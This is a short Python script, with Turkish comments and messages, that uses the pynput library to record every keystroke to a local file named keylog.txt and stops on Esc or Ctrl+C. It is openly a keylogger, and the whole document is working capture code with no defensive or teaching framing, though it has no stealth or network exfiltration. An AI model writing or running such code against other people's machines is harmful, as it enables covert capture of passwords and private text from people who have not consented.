from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"Basılan Tuş: {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as file:
            if key == keyboard.Key.space:
                file.write("Basılan Tuş: [SPACE]\n")
            elif key == keyboard.Key.enter:
                file.write("Basılan Tuş: [ENTER]\n")
            elif key == keyboard.Key.tab:
                file.write("Basılan Tuş: [TAB]\n")
            else:
                file.write(f"Basılan Tuş: {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

                        # CTRL+C Basınca Program Kapansın
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nKeylogger Durduruldu.")
